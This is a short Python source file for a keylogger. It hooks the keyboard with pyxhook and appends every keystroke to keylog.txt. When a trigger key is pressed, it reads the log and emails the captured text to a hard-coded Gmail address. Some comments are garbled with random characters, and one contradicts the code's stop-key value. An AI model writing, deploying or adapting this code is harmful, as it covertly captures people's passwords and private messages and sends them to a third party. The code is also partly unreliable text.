import pyxhook
import os
from mailAdapter import MailAdapter


class HookManager:
    hookman = None
    logfile = os.getcwd() + "keylog.txt"
    closechar = 49
    mailAd = MailAdapter()
    activeFlag = False
    def __init__(self):
        self.hookman = pyxhook.HookManager()
        # Define our callback to fire when a key is pressed downmfgshdgjf,jfgkjdgkjfhgzkjh768687687694754otu8578945
        self.hookman.KeyDown = self.keyEvent
        # Hook the keyboard
        self.hookman.HookKeyboard()
        # Start our listener
        self.hookman.start()
        self.activeFlag = True

    def keyEvent(self, event):
        fob = open(self.logfile, 'a')
        fob.write(event.Key)
        fob.write('\n')
        print(event.Ascii)
        if event.Ascii == self.closechar:  # 96 is the asciaas1e of the grave key (`)
            print("----STOP-----")
            fob.close()
            self.hookman.cancel()
            self.activeFlag = False
            fob = open(self.logfile, "r+")
            text = fob.read()
            fob.close()
            self.mailAd.send(text,["Fyodorov.aleksej@gmail.com"])

    def isactive(self):
        return self.activeFlag